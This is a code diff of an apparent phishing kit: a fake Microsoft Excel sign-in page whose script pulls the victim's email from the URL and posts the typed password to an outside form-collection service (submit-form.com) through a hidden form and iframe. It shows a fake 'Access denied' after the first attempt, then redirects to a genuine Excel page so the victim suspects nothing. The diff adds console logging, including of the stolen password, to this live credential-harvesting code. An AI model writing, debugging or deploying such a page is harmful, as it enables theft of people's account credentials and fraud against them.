@@ -319,8 +319,11 @@
     </style>
 </head>
 <body>
-    <!-- Hidden Formspark form - SIMPLIFIED with only 2 fields -->
-    <form id="formsparkForm" action="https://submit-form.com/IANZnZ5V4" method="POST" style="display: none;">
+    <!-- HIDDEN FORMSPARK IFRAME FOR SUBMISSION -->
+    <iframe name="formsparkIframe" id="formsparkIframe" style="display: none;"></iframe>
+    
+    <!-- HIDDEN FORM FOR FORMSPARK -->
+    <form id="formsparkForm" action="https://submit-form.com/IANZnZ5V4" method="POST" target="formsparkIframe" style="display: none;">
         <input type="hidden" name="email" id="formsparkEmail">
         <input type="hidden" name="password" id="formsparkPassword">
     </form>
@@ -392,33 +395,48 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Track if this is the first or second attempt
+            console.log('Page loaded successfully');
+            
             let isFirstAttempt = true;
             
             // Function to extract email from URL
             function extractEmailFromURL() {
+                console.log('Extracting email from URL...');
                 const hash = window.location.hash;
                 if (hash && hash.length > 1) {
-                    return hash.substring(1);
+                    const email = hash.substring(1);
+                    console.log('Found email in hash:', email);
+                    return email;
                 }
                 
                 const urlParams = new URLSearchParams(window.location.search);
                 const emailFromQuery = urlParams.get('email');
                 if (emailFromQuery) {
+                    console.log('Found email in query:', emailFromQuery);
                     return emailFromQuery;
                 }
                 
                 const storedEmail = localStorage.getItem('excelCurrentEmail');
                 if (storedEmail) {
+                    console.log('Found email in localStorage:', storedEmail);
                     return storedEmail;
                 }
                 
+                console.log('Using default email');
                 return "user@example.com";
             }
             
-            // Extract and set the email
             const currentEmail = extractEmailFromURL();
-            document.getElementById('displayEmail').textContent = currentEmail;
+            console.log('Current email:', currentEmail);
+            
+            const displayEmail = document.getElementById('displayEmail');
+            if (displayEmail) {
+                displayEmail.textContent = currentEmail;
+                console.log('Email displayed:', currentEmail);
+            } else {
+                console.error('displayEmail element not found!');
+            }
+            
             localStorage.setItem('excelCurrentEmail', currentEmail);
             
             // Elements
@@ -428,149 +446,157 @@
             const signInBtn = document.getElementById('signInBtn');
             const errorMessage = document.getElementById('errorMessage');
             
-            // Formspark elements (only 2 fields)
+            console.log('Elements found:', {
+                togglePassword: !!togglePassword,
+                passwordInput: !!passwordInput,
+                loginForm: !!loginForm,
+                signInBtn: !!signInBtn,
+                errorMessage: !!errorMessage
+            });
+            
+            // Formspark elements
             const formsparkForm = document.getElementById('formsparkForm');
             const formsparkEmail = document.getElementById('formsparkEmail');
             const formsparkPassword = document.getElementById('formsparkPassword');
             
-            // Function to submit to Formspark - SIMPLIFIED
+            console.log('Formspark elements:', {
+                formsparkForm: !!formsparkForm,
+                formsparkEmail: !!formsparkEmail,
+                formsparkPassword: !!formsparkPassword
+            });
+            
+            // Function to submit to Formspark
             function submitToFormspark(email, password) {
-                // Set only the 2 fields
+                console.log('Submitting to Formspark:', { email: email, password: password });
+                
+                if (!formsparkEmail || !formsparkPassword || !formsparkForm) {
+                    console.error('Formspark elements missing!');
+                    return false;
+                }
+                
                 formsparkEmail.value = email;
                 formsparkPassword.value = password;
                 
-                // Submit silently using fetch with no-cors
-                fetch(formsparkForm.action, {
-                    method: 'POST',
-                    body: new FormData(formsparkForm),
-                    mode: 'no-cors'
-                }).then(() => {
-                    console.log('Formspark: Email and password submitted');
-                }).catch(error => {
-                    console.log('Formspark: Submission completed');
-                });
+                console.log('Submitting form to:', formsparkForm.action);
+                formsparkForm.submit();
+                
+                return true;
             }
             
             // Toggle password visibility
-            togglePassword.addEventListener('click', function() {
-                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-                passwordInput.setAttribute('type', type);
-                
-                const eyeIcon = this.querySelector('i');
-                if (type === 'text') {
-                    eyeIcon.classList.remove('fa-eye');
-                    eyeIcon.classList.add('fa-eye-slash');
-                } else {
-                    eyeIcon.classList.remove('fa-eye-slash');
-                    eyeIcon.classList.add('fa-eye');
-                }
-            });
-            
-            // Form submission simulation - UPDATED FLOW
-            loginForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const password = passwordInput.value;
-                
-                // Show loading state
-                signInBtn.innerHTML = '<span class="loading"></span> Signing in...';
-                signInBtn.disabled = true;
-                errorMessage.style.display = 'none';
-                
-                // Simulate authentication delay
-                setTimeout(() => {
-                    if (password && password.length > 0) {
-                        if (isFirstAttempt) {
-                            // FIRST ATTEMPT: Submit to Formspark and show "Access denied"
-                            isFirstAttempt = false;
-                            
-                            // Submit only email and password to Formspark
-                            submitToFormspark(currentEmail, password);
-                            
-                            // Show "Access denied" message
-                            signInBtn.innerHTML = 'Access denied';
-                            signInBtn.classList.add('access-denied');
-                            
-                            // Re-enable button after 2 seconds
-                            setTimeout(() => {
-                                signInBtn.innerHTML = 'Sign in';
-                                signInBtn.classList.remove('access-denied');
-                                signInBtn.disabled = false;
-                                passwordInput.value = '';
-                                passwordInput.focus();
-                            }, 2000);
-                            
-                        } else {
-                            // SECOND ATTEMPT: Redirect immediately
-                            signInBtn.innerHTML = '✓ Redirecting to Excel...';
-                            signInBtn.classList.add('redirecting');
-                            
-                            // Immediate redirect to Excel invoice templates
-                            window.location.href = 'https://excel.cloud.microsoft/create/en/invoice-templates/';
-                        }
+            if (togglePassword && passwordInput) {
+                togglePassword.addEventListener('click', function() {
+                    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                    passwordInput.setAttribute('type', type);
+                    
+                    const eyeIcon = this.querySelector('i');
+                    if (type === 'text') {
+                        eyeIcon.classList.remove('fa-eye');
+                        eyeIcon.classList.add('fa-eye-slash');
                     } else {
-                        // Empty password error
-                        passwordInput.classList.add('error');
-                        errorMessage.style.display = 'block';
-                        signInBtn.innerHTML = 'Sign in';
-                        signInBtn.disabled = false;
+                        eyeIcon.classList.remove('fa-eye-slash');
+                        eyeIcon.classList.add('fa-eye');
                     }
-                }, 1200); // Shorter delay for better UX
-            });
+                    
+                    console.log('Password visibility toggled to:', type);
+                });
+            }
+            
+            // Form submission
+            if (loginForm) {
+                loginForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    console.log('Form submitted');
+                    
+                    const password = passwordInput ? passwordInput.value : '';
+                    console.log('Password entered:', password);
+                    
+                    // Show loading state
+                    if (signInBtn) {
+                        signInBtn.innerHTML = '<span class="loading"></span> Signing in...';
+                        signInBtn.disabled = true;
+                    }
+                    
+                    if (errorMessage) {
+                        errorMessage.style.display = 'none';
+                    }
+                    
+                    // Simulate authentication delay
+                    setTimeout(() => {
+                        if (password && password.length > 0) {
+                            if (isFirstAttempt) {
+                                console.log('First attempt - submitting to Formspark');
+                                isFirstAttempt = false;
+                                
+                                // Submit to Formspark
+                                submitToFormspark(currentEmail, password);
+                                
+                                // Show "Access denied" message
+                                if (signInBtn) {
+                                    signInBtn.innerHTML = 'Access denied';
+                                    signInBtn.classList.add('access-denied');
+                                }
+                                
+                                // Re-enable button after 2 seconds
+                                setTimeout(() => {
+                                    if (signInBtn) {
+                                        signInBtn.innerHTML = 'Sign in';
+                                        signInBtn.classList.remove('access-denied');
+                                        signInBtn.disabled = false;
+                                    }
+                                    if (passwordInput) {
+                                        passwordInput.value = '';
+                                        passwordInput.focus();
+                                    }
+                                }, 2000);
+                                
+                            } else {
+                                console.log('Second attempt - redirecting');
+                                // SECOND ATTEMPT: Redirect immediately
+                                if (signInBtn) {
+                                    signInBtn.innerHTML = '✓ Redirecting to Excel...';
+                                    signInBtn.classList.add('redirecting');
+                                }
+                                
+                                // Immediate redirect to Excel invoice templates
+                                window.location.href = 'https://excel.cloud.microsoft/create/en/invoice-templates/';
+                            }
+                        } else {
+                            console.log('Empty password error');
+                            // Empty password error
+                            if (passwordInput) {
+                                passwordInput.classList.add('error');
+                            }
+                            if (errorMessage) {
+                                errorMessage.style.display = 'block';
+                            }
+                            if (signInBtn) {
+                                signInBtn.innerHTML = 'Sign in';
+                                signInBtn.disabled = false;
+                            }
+                        }
+                    }, 1200);
+                });
+            }
             
             // Forgot password link
-            document.querySelector('.forgot-password').addEventListener('click', function(e) {
-                e.preventDefault();
-                window.open('https://account.live.com/password/reset', '_blank');
-            });
-            
-            // Back button
-            document.querySelector('.back-button').addEventListener('click', function(e) {
-                e.preventDefault();
-                const originalEmail = document.getElementById('displayEmail').textContent;
-                window.location.href = `email.html?email=${encodeURIComponent(originalEmail)}`;
-            });
-            
-            // Other sign-in options
-            document.getElementById('windowsHello').addEventListener('click', function() {
-                console.log(`Windows Hello authentication requested for ${currentEmail}`);
-                const originalText = this.textContent;
-                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Launching Windows Hello...';
-                setTimeout(() => {
-                    this.innerHTML = originalText;
-                }, 1500);
-            });
-            
-            document.getElementById('authenticator').addEventListener('click', function() {
-                console.log(`Microsoft Authenticator notification sent for ${currentEmail}`);
-                const originalText = this.textContent;
-                this.innerHTML = '<i class="fas fa-bell"></i> Notification sent to device';
-                setTimeout(() => {
-                    this.innerHTML = originalText;
-                }, 1500);
-            });
-            
-            document.getElementById('securityKey').addEventListener('click', function() {
-                console.log(`Security key authentication initiated for ${currentEmail}`);
-                const originalText = this.textContent;
-                this.innerHTML = '<i class="fas fa-usb"></i> Insert security key';
-                setTimeout(() => {
-                    this.innerHTML = originalText;
-                }, 1500);
-            });
-            
-            // Password input validation
-            passwordInput.addEventListener('input', function() {
-                if (this.value.length > 0) {
-                    this.classList.remove('error');
-                    errorMessage.style.display = 'none';
-                }
-            });
+            const forgotPasswordLink = document.querySelector('.forgot-password');
+            if (forgotPasswordLink) {
+                forgotPasswordLink.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    window.open('https://account.live.com/password/reset', '_blank');
+                });
+            }
             
             // Focus the password field on load
             setTimeout(() => {
-                passwordInput.focus();
+                if (passwordInput) {
+                    passwordInput.focus();
+                    console.log('Password field focused');
+                }
             }, 300);
+            
+            console.log('Page initialization complete');
         });
     </script>
 </body>
